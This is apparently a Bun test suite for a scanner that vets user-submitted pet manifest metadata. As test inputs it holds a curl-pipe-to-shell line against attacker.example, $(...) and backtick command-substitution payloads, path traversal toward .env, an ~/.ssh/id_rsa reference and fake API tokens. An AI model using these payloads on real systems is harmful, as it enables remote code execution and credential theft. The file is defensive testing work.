import { describe, expect, it } from "bun:test";

import { scanPetManifestsSecurity, scanPetSecurity } from "@/lib/pet-security";

describe("scanPetSecurity", () => {
  it("passes normal pet metadata", () => {
    const result = scanPetSecurity({
      petJson: {
        id: "boba",
        displayName: "Boba",
        description: "A tiny companion.",
        spritesheetPath: "spritesheet.webp",
        states: {
          idle: { row: 0, frames: 8 },
        },
      },
      displayName: "Boba",
      description: "A tiny companion.",
    });

    expect(result.decision).toBe("pass");
    expect(result.findings).toEqual([]);
  });

  it("allows free-text file labels in submitted metadata", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        spritesheetPath: "spritesheet.webp",
      },
      description: "source file: spritesheet.webp",
    });

    expect(result.decision).toBe("pass");
    expect(result.findings).toEqual([]);
  });

  it("fails real active script URLs", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        homepage: "file:///tmp/pwned",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "active_script_url",
    );
  });

  it("fails shell command substitution payloads", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba $(touch /tmp/pwned)",
        spritesheetPath: "spritesheet.webp",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings[0]?.code).toBe("shell_command_substitution");
    expect(result.findings[0]?.severity).toBe("fail");
    expect(result.findings[0]?.path).toBe("$.displayName");
  });

  it("allows harmless backticks in free-text descriptions", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        description: "Uses `pet.json` and `spritesheet.webp`.",
      },
    });

    expect(result.decision).toBe("pass");
    expect(result.findings).toEqual([]);
  });

  it("fails shell-like backtick command substitutions", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "`touch /tmp/pwned`",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings[0]?.code).toBe("shell_command_substitution");
  });

  it("fails executable metadata keys", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        command: "curl https://attacker.example/p.sh | sh",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "executable_metadata_key",
    );
  });

  it("holds external URLs without auto-rejecting", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        homepage: "https://example.com/boba",
      },
    });

    expect(result.decision).toBe("hold");
    expect(result.findings[0]?.code).toBe("external_url_in_pet_json");
    expect(result.findings[0]?.severity).toBe("hold");
  });

  it("fails path traversal in path-like keys", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        spritesheetPath: "../secrets/.env",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "path_traversal",
    );
  });

  it("holds credential references in free-text descriptions", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        description: "No .env file is included and localStorage is unused.",
      },
    });

    expect(result.decision).toBe("hold");
    expect(result.findings[0]?.severity).toBe("hold");
    expect(result.findings[0]?.code).toBe("credential_exfiltration_reference");
  });

  it("fails credential references in structured metadata", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        spritesheetPath: "~/.ssh/id_rsa",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "credential_exfiltration_reference",
    );
  });

  it("redacts sensitive values from findings and reasons", () => {
    const result = scanPetSecurity({
      petJson: {
        apiKey: "sk-live-real-secret-value $(touch /tmp/pwned)",
        description: "reads process.env.OPENAI_API_KEY",
      },
    });
    const serialized = JSON.stringify(result);

    expect(result.decision).toBe("fail");
    expect(serialized).not.toContain("sk-live-real-secret-value");
    expect(serialized).not.toContain("OPENAI_API_KEY");
    expect(serialized).not.toContain("touch /tmp/pwned");
    expect(serialized).toContain("[redacted]");
  });

  it("redacts token-shaped values from non-sensitive findings", () => {
    const result = scanPetSecurity({
      petJson: {
        description: "sk-proj-real-secret-token $(touch /tmp/pwned)",
      },
    });
    const serialized = JSON.stringify(result);

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "shell_command_substitution",
    );
    expect(serialized).not.toContain("sk-proj-real-secret-token");
    expect(serialized).toContain("[redacted secret]");
  });

  it("detects sensitive env-style keys with token-shaped values", () => {
    const result = scanPetSecurity({
      petJson: {
        OPENAI_API_KEY: "sk-proj-real-secret-token",
        openaiApiKey: "sk-live-real-secret-token",
      },
    });
    const serialized = JSON.stringify(result);

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "credential_exfiltration_reference",
    );
    expect(serialized).not.toContain("sk-proj-real-secret-token");
    expect(serialized).not.toContain("sk-live-real-secret-token");
  });

  it("fails token-shaped values in camelCase sensitive keys", () => {
    const result = scanPetSecurity({
      petJson: {
        openaiApiKey: "sk-live-real-secret-token",
      },
    });
    const serialized = JSON.stringify(result);

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "secret_token_value",
    );
    expect(serialized).not.toContain("sk-live-real-secret-token");
  });

  it("fails command payloads in object keys", () => {
    const result = scanPetSecurity({
      petJson: {
        states: {
          "$(touch /tmp/pwned)": { row: 0 },
        },
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "shell_command_substitution",
    );
  });

  it("redacts token-shaped object keys from stored paths", () => {
    const result = scanPetSecurity({
      petJson: {
        "sk-live-real-secret-token": "$(touch /tmp/pwned)",
      },
    });
    const serialized = JSON.stringify(result);

    expect(result.decision).toBe("fail");
    expect(serialized).not.toContain("sk-live-real-secret-token");
    expect(serialized).toContain("redactedKey");
  });

  it("keeps fail decisions after the visible findings cap is reached", () => {
    const result = scanPetSecurity({
      petJson: {
        links: Array.from(
          { length: 30 },
          (_, index) => `https://example.com/${index}`,
        ),
        displayName: "Boba $(touch /tmp/pwned)",
      },
    });

    expect(result.findings).toHaveLength(24);
    expect(result.decision).toBe("fail");
    expect(result.findings.some((finding) => finding.severity === "fail")).toBe(
      true,
    );
    expect(result.findings.map((finding) => finding.code)).toContain(
      "shell_command_substitution",
    );
  });

  it("fails malicious zip pet.json even when standalone pet.json is clean", () => {
    const result = scanPetManifestsSecurity({
      petJson: { displayName: "Boba", states: { idle: { row: 0 } } },
      zipPetJson: {
        displayName: "Boba $(touch /tmp/pwned)",
        states: { idle: { row: 0 } },
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.path)).toContain(
      "zip.petJson.displayName",
    );
    expect(result.findings.map((finding) => finding.code)).toContain(
      "pet_json_manifest_mismatch",
    );
  });

  it("holds instead of throwing when manifest comparison exceeds safety limits", () => {
    const deepPetJson: Record<string, unknown> = { displayName: "Boba" };
    let cursor = deepPetJson;
    for (let index = 0; index < 2000; index++) {
      const next: Record<string, unknown> = {};
      cursor.child = next;
      cursor = next;
    }

    const result = scanPetManifestsSecurity({
      petJson: deepPetJson,
      zipPetJson: { displayName: "Boba" },
    });

    expect(result.decision).toBe("hold");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "pet_json_manifest_comparison_limit",
    );
  });

  it("holds when standalone and zip pet manifests differ", () => {
    const result = scanPetManifestsSecurity({
      petJson: { displayName: "Boba", states: { idle: { row: 0 } } },
      zipPetJson: { displayName: "Boba", states: { idle: { row: 1 } } },
    });

    expect(result.decision).toBe("hold");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "pet_json_manifest_mismatch",
    );
  });
});
